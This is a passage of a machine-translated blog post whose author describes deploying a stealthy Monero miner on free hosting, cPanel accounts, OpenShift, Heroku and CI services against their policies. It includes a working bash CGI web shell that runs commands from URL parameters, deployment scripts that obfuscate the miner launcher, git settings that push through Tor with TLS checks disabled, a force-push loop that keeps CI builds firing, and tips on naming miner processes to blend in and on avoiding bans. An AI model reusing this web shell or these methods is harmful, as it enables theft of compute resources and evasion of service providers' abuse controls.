    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>在对矿工进行编码时，bash 遇到的一个令人抓狂的怪癖是用带引号的子shell 分配变量<code>myvar="$(something)"</code> 导致内存使用量永久增加，这很难调试，并且还没有真正找到行为如此的原因，无论如何分配必须不加引号。解码是用<em> 字符串</em> 这是对临时文件的抽象，变量被转储到一个文件中，然后通过管道返回到进程中。<p>矿工长运行循环：<ul><li><p>虽然是真的<ul><li><p>停止矿工<li><p>删除配置<li><p>启动矿工<li><p>虽然是真的<ul><li><p>启动守护进程<ul><li><p>矿工运行时<ul><li><p>读取矿工的输出<li><p>根据输出线选择矿工操作</ul></ul><li><p>如果矿工没有运行：break</ul><li><p>睡觉</ul></ul><p>输出行与一些正则表达式匹配：<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>守护进程处理以下情况<ul><li><p>与端点的连接出错（选择一个新的随机端点）<li><p>散列算法更改（调整睡眠时间和临时配置）<li><p>矿工问题（重启矿工）。</ul><p>有一段时间支持命令和控制仪表板，它允许触发手动重启，但是由于它的使用最少，它被丢弃，并且它的端点被替代池连接替换，重启过程也不稳定，复杂。 ..技术债务的另一个例子。然而，它允许重新获取更新的有效载荷并即时重新设置所有配置，这非常酷，是终极蹦床。<h2 id=debugging><a class=header-anchor href=#debugging> 调试</a></h2><p>有三个主要的实用程序<ul><li><p>启用/禁用代码块周围的跟踪（我们不想在变量中跟踪 b64 编码的二进制文件..）<li><p>格式化日志的简单功能<li><p>每当矿工启动时，都会在运行时激活详细日志记录的标志。<ul><li><p>文件<code>.debug</code> 存在？<ul><li><p>启用详细日志记录</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> 目标部署</a></h2><p>此设置已在 3 种主机上进行了测试：<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> 自托管容器或虚拟机</a></h3><p>许多托管服务提供商不喜欢挖矿，因为 CPU 资源往往在多个用户之间共享，而挖矿软件很容易减慢主机节点的速度，从而影响其他用户的性能。即使 CPU 用户时间是无限的，这也是正确的，因为如果缓存在所有 CPU 内核之间共享，哈希算法可以使 CPU 的所有缓存层饱和。<p>我们想用我们的<em> 公平的</em> 在不被禁止的情况下共享资源，这是我们的隐形投放器的一个很好的用例，因为它可以感知主机使用情况，这意味着它<em> 应该</em> 保持在 [AUP] 范围内。处理自托管部署时没有额外的步骤，只需启动程序脚本，可以添加到启动序列或手动启动。<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> 基于 cPanel 的网络托管</a></h3><p>Web 托管订阅计划主要通过 [cPanel] 提供。在这里，我们再次使用具有合理资源限制的个人订阅计划，另一方面，任何免费计划都有荒谬的限制<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel 允许您为不同的文件扩展名定义处理程序，这允许我们通过<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> 计算机图形学</a> 使用针对上传到服务器上的 shell 脚本的 http 请求。这些接口就是 web-shell 的样子<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> .一个简单的 bash web shell<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>最好只依赖内置程序，因为在网络监狱中可能不允许分叉额外的进程，但总是有可能<code>exec</code> 这允许我们使用大多数命令行实用程序。大多数 web shell 是用其他脚本语言编写的，比如 python 或 php，因为你不必担心分叉。<p>在 cpanel 环境中，最好为矿工进程使用静态名称，例如<code>httpd</code> 或者<code>php-fpm</code> 因为<code>cgi</code> 基于多处理，因此服务器总是充满了许多这样命名的进程，尽管细心的观察者应该注意到<em> 多线程</em> 对于 perl、php、ruby 或 python 等语言来说，绝对不常见（或不可能）的使用模式！<p>默认情况下，进程也有时间限制（1 小时、1 天等），为此我们只使用重新启动 dropper 的 cron 作业。<p>这需要大量的手动编辑，不幸的是，用于自动执行此操作的 cpanel api 并未向最终用户公开，因此对于我们的矿工 dropper 而言，网络托管是一个笨重而乏味的目标。<h3 id=web_environments><a class=header-anchor href=#web_environments> 网络环境</a></h3><p>有<em> 软件即服务</em> 具有 Web 编辑器和容器的提供程序，例如<a href="with a free tier before getting acquired by amazon"> 云9</a> , [codeanywhere], [codenvy]。在这里部署 dropper 很容易（你有一个完整的环境），但保持它运行是一种负担，因为任何交互式 web 编辑器在网页关闭后很快就会终止它的会话，并且容器因此进入睡眠状态（除非你当然付钱）。<p>规避这一点只能意味着我们必须保持会话打开，[puppeteer] 的一些脚本实现了预期的结果，但是长时间运行、内存泄漏、膨胀的 SPA 网页绝对没有吸引力且不隐蔽，因为从提供程序后端， 24/7 打开的会话肯定会看起来很可疑。事实上，网络环境也是笨重和无聊的目标。<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> 免费应用服务</a></h3><p>这主要是<a href="when it used to have a free tier"> 开班</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> 和 [heroku]。 Openshift，作为 kubernetes 部署起来有些简单，但充满了配置混乱，这里是一个摘录：<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>这是用于构建需要 yaml 模板的挖掘容器的脚本：<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>但是整个过程涉及的步骤相当多！<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>在伪代码中：<ul><li><p>创建项目<li><p>创建没有图像的应用程序<li><p>构建挖矿容器<li><p>使用部署配置（kubernetes 抽象）部署容器<li><p>推出部署</ul><p>这<code>build-build</code> 脚本反而创建了一个<em> 建造</em>一次可以开采几个小时的容器。构建和普通 Pod 在 openshift 中具有不同的资源，因此我们同时利用了它们。 Openshift 总体上是一个糟糕的体验，因为它经历了 4 个不同的版本（也许更多，我在一段时间后停止跟踪）并且每个版本都需要更改配置，它们没有升级路径并且所有内容都被快速迭代，这很常见对于构建/pods 停止，而不是被垃圾收集......他们通常每隔一段时间手动重启一次，也许 kubernetes 只是有问题:)<p>Heroku 配置稍微简单一点（它不涉及 kubernetes）。除了类似于 openshift 的容器构建之外，其余的只是两个 cli 命令<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>容器直接通过 docker 推送到 heroku 注册表。<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> 与 heroku（在撰写本文时免费套餐仍然有效）的摩擦在于 dynos 每月只能运行 22 天，因此他们每个月都需要进行一些手动管理，同样又笨拙又乏味。一开始他们确实执行了一些禁令，然后他们通过 TOR 禁用了注册，我很确定我是造成这种情况的原因。<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> CI 容器或 VM</a></h3><p>这些是我们的滴管最协同的目标。有许多<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> 很多公司都在烧投资者的钱提供免费等级，希望在技术基础设施业务中获得一些市场份额。<p>所有这些服务提供不同的资源，具有不同的配置要求并在不同的环境中运行。我从来没有考虑过自动化帐户注册，因为这些东西编程起来很可怕，我一直试图避免它们，所以我只是忍受了一段时间的手动注册，因为我很好奇我会得到什么样的反垃圾邮件响应（和与其他人多么不同！）。您可以从公司处理垃圾邮件的方式猜出一些有关公司管理的信息：<ul><li><p>它是否执行禁令波？然后他们有不严格的政策，问题是手动处理的，逐案处理<li><p>需要手机验证吗？他们过去已经被虐待了<li><p>他们是否对大量资源使用做出反应？他们的预算很紧<li><p>他们是否应用帐户限制或影子禁令？如果他们影子禁令，他们有刻薄的系统管理员。</ul><p>还有一个哲学问题：如果一个服务允许你长期滥用他们的系统，这是否意味着他们拥有能够处理负载的顶级基础设施，或者只是对其系统的控制不佳？而且您必须考虑可访问性和安全性之间的平衡，太安全的系统会降低用户保留率。<p>这是一个表格，显示了我部署到的一些服务：<table><tbody><tr class="header headerLastRow"><th style=text-align:center>词<th style=text-align:center>配置<th style=text-align:center>表现<th style=text-align:center>班锤<tr><td style=text-align:center>比特升<td style=color:red;text-align:center>坏的<td style=color:#ff0;text-align:center>中等的<td style=color:#ff0;text-align:center>中等的<tr><td style=text-align:center>特拉维斯<td style=color:green;text-align:center>好的<td style=color:#ff0;text-align:center>中等的<td style=color:green;text-align:center>好的<tr><td style=text-align:center>代号<td style=color:#ff0;text-align:center>中等的<td style=color:red;text-align:center>坏的<td style=color:#ff0;text-align:center>中等的<tr><td style=text-align:center>GitLab<td style=color:#ff0;text-align:center>中等的<td style=color:green;text-align:center>好的<td style=color:green;text-align:center>好的<tr><td style=text-align:center>圈子<td style=color:red;text-align:center>坏的<td style=color:green;text-align:center>好的<td style=color:#ff0;text-align:center>中等的<tr><td style=text-align:center>信号<td style=color:green;text-align:center>好的<td style=color:green;text-align:center>好的<td style=color:#ff0;text-align:center>中等的<tr><td style=text-align:center>码头工人<td style=color:#ff0;text-align:center>中等的<td style=color:#ff0;text-align:center>中等的<td style=color:green;text-align:center>好的<tr><td style=text-align:center>码头<td style=color:green;text-align:center>好的<td style=color:#ff0;text-align:center>中等的<td style=color:#ff0;text-align:center>中等的<tr><td style=text-align:center>码鲜<td style=color:red;text-align:center>坏的<td style=color:green;text-align:center>好的<td style=color:#ff0;text-align:center>中等的<tr><td style=text-align:center>威克<td style=color:#ff0;text-align:center>中等的<td style=color:#ff0;text-align:center>中等的<td style=color:red;text-align:center>坏的<tr><td style=text-align:center>蔚蓝管道<td style=color:#ff0;text-align:center>中等的<td style=color:#ff0;text-align:center>中等的<td style=color:red;text-align:center>坏的<tr><td style=text-align:center>连续php<td style=color:red;text-align:center>坏的<td style=color:#ff0;text-align:center>中等的<td style=color:#ff0;text-align:center>中等的<tr><td style=text-align:center>伙伴<td style=color:red;text-align:center>坏的<td style=color:red;text-align:center>坏的<td style=color:red;text-align:center>坏的<tr><td style=text-align:center>无人机<td style=color:red;text-align:center>坏的<td style=color:green;text-align:center>好的<td style=color:red;text-align:center>坏的<tr><td style=text-align:center>应用程序<td style=color:red;text-align:center>坏的<td style=color:#ff0;text-align:center>中等的<td style=color:red;text-align:center>坏的<tr><td style=text-align:center>永不编码<td style=color:red;text-align:center>坏的<td style=color:green;text-align:center>好的<td style=color:#ff0;text-align:center>中等的<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>坏的<td style=color:green;text-align:center>好的<td style=color:red;text-align:center>坏的</table><p>在这种情况下，一个<span style=color:green> 好的</span> 配置意味着不需要太多时间来配置一个<code>ci</code> 挖掘过程的工作（就像所有依赖网络仪表板而不是存储库点文件的服务都是一件苦差事），一个<span style=color:red> 坏的</span><code>ban-hammer</code> 意味着很难注册到该服务，或者帐户将被更积极地禁止。<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> 比特升</a> 需要设置一个项目，推断环境，目标架构，执行过程和其他事情，设置构建非常耗时，因此在配置中得到了很差的评价。<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> 连续php</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> 伙伴</a> , [Codefresh] 也有很多手动非声明性配置步骤。<p>[Azure-pipelines] 等服务，<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> 威克</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> 伙伴</a> 对帐户应用影子禁令，影子禁令很糟糕，因为它们让您猜测您的配置是否有问题。对于某些服务，您可以猜测禁令的原因（几乎是您的构建花费了太多时间，或者您在短时间内构建了太多次），对于其他一些服务，例如 [Azure-pipelines]，我认为他们应用了某种指纹到用户存储库，因为即使没有任何滥用资源的禁令也会通过，azure 和 vercel 也受到限制<code>DNS</code> 公共建筑机器内的访问，因此需要通过临时隧道克服额外的摩擦。<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> 无人机</a> 可以访问整个 16 核以上的处理器，但最终在 2 次构建后被禁止<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> 代号</a> 还可以访问强大的构建主机，并且没有像无人机那样积极地禁止。<p>我最喜欢的服务不是因为盈利能力，而是为了方便和方便（还有其他项目）<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> 特拉维斯</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> 信号</a> 和<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a>. Travis 就像标准的 CI 并且非常灵活，Semaphore 是唯一的<code>DSL</code> 为了<code>CI</code> 这看起来平易近人而且很好，而不是像其他 UI 一样只是无休止的意大利面条式复选框，而 Docker 只是为了将 dockerfiles 映射到构建的简单性。<h3 id=builds_configs><a class=header-anchor href=#builds_configs> 构建配置</a></h3><p>构建由 Web 服务提供的 cron 作业或 git commits 触发。因此，您必须跟踪大量的访问令牌或 ssh 密钥来管理所有 git 提交。同样重要的是不要过度垃​​圾邮件提交，并在推送到配置 git 的存储库时使用代理：<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>使用 git 托管服务，github 一直是更彻底的禁令，但它们仅在 ci 服务管理员的滥用报告时执行，当我尝试更新 CI 试用（不小心）时，gitlab 执行了一次禁令浪潮。我从未收到过 bitbucket 帐户的禁令。为了（强制）推送 git 提交，我们有一个很长的运行循环来重新标记 git 存储库：<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>以这种方式强制推送可能不是 github 非常喜欢的东西，并且可能是帐户被标记的原因。负责强制推送不同提交的标记器功能使用一个网站（您可以很容易地查找），该网站提供一些随机提交。我不确定这有多大帮助，因为提交的内容本身对我的情况显然是可疑的。并且它也曾经咬我一口，因为这个命令返回的提交可能包含脏话，我的一个提交被一个 twitter 机器人捡到了，该机器人用脏话跟踪 git 提交！事发后，我加了黑名单中的坏话。<p>我还没有真正深入研究混淆的 git 提交和混淆的 git 存储库。我使用更复杂的存储库的唯一实例是使用 Bitrise，因为如果系统无法识别环境（如移动应用程序），您将无法设置构建，但即便如此，也没有任何轮换并且始终相同存储库，很容易发现。<p>总的来说，如果我必须围绕最佳开采时间绘制钟形曲线<em> 没有</em>在所有经过测试的服务中，禁止帐户的中心构建时间约为 1 小时，每天一次。对于 cpu 内核，除了几个外部骗子（如无人机），大多数服务都希望您使用提供给您的全部资源，因为构建是在资源受限的 VM 或容器内运行的……而编译通常是一项任务使 cpu 饱和，因此它没有统计相关性。直观地说，普通开发人员每天都会做一个构建，所以如果你偏离平均值，你应该期待升高的标志，并且推动滥用永远不会结束。<h2 id=conclusions><a class=header-anchor href=#conclusions> 结论</a></h2><p>它值得吗？网络部分绝对有趣，处理帐户注册显然是最糟糕的部分，毕竟没有人喜欢点击无休止的确认电子邮件和重复头脑麻木的 UI 程序。编写垃圾邮件自动化软件也很无聊（因为你主要是在研究愚蠢的 API），而且有了这个假设（以及这从来都不是什么严重的事实），我什至从未考虑过。是否有利可图？在它的高峰期，它达到了类似的东西<code>300$</code> 每个月，对于委内瑞拉人来说可能足够了，对我来说不是真的:)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> 脾气暴躁的系统管理员</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>尽管这会打破许多隐私假设，但我相信他们中的大多数人只要有现有问题就会偷看，但这只是基于容器的运行时的问题，而虚拟机几乎是黑匣子。</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>内置于 monero 节点的矿工做了一些工作以使其对后台更加友好，但 xmrig 的发行版从未专注于后台友好。</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>一些矿池在不同的连接端口上提供了不同的难度，并且倾向于将作业难度与矿工提交的份额对齐，但代理的粒度仍然更方便，因为它会阻止矿池<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> 锁定</a> （尽管我们从未真正切换过池）。</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>当配置突然出现并从文件系统中消失时，它很不高兴</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>我们不谈论<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> 层协议</a> 因为我们只需要处理在<em> 两个都</em> 矿池和矿工……这通常是最低限度的，可能还有非标准的扩展。</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>永远不要全力以赴 :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>我还没有探讨当进程在运行时加载附加功能时会发生什么，因为内核会在可执行文件的内存布局中寻找地址，这会访问文件系统并可能导致崩溃。</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>限制是任意的，cpu时间小于一秒，内存小于128M，出站连接被阻塞。</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>有一点耐心，您还可以在围绕您的 cpanel 帐户空间引导的环境中运行完整的 ssh 实例，<em> 没有</em> 可以访问 cpanel 内置的 SSH，它往往被托管服务提供商禁用。</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift 从 1 年免费套餐到 3 个月到 1 个月，开始需要电话身份验证，我可以保证我不是唯一滥用他们服务的人。</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Heroku 免费层容器在资源方面非常慷慨，它们提供 4c/8t（虚拟）CPU、大量内存和大存储（但是它不是持久的并且在 dyno 关闭时被丢弃）。</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>他们添加了更严格的注册规则，在几次禁令之后，我可能对此有所贡献。</table><p><div id=post-tags-list>帖子标签： <span class=post-tag><a href=https://www.unto.re/tag/crypto> 加密</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> 网</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> 贝壳</a></span></div><div class=page-foot><div class=copyright>2021 年 8 月 21 日</div><script async crossorigin=anonymous issue-term=pathname label=Comment repo=untoreh/untoreh.github.io src=https://utteranc.es/client.js></script></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - 技术支持<a href=https://github.com/tlienart/Franklin.jl> 富兰克林</a></div><div class=page__footer-links>- <ul><li><a href=/zh/sitemapxml> 